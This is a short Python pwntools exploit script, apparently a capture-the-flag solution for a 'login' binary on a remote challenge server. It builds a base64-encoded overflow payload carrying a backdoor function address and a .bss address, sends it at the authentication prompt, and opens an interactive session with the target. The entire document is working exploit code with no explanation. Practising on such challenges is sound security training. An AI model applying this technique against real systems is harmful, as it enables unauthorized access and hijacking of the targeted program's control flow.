from pwn import *
from base64 import b64encode

#p = process('./login')
p = remote('node4.buuoj.cn', 29369)
#gdb.attach(p, 'b *0x80492ba')

backdoor = 0x08049284
bss = 0x0811EB40

payload = b64encode(b'aaaa' + p32(0x08049284) + p32(bss))

p.sendlineafter(b'Authenticate : ', payload)

p.interactive()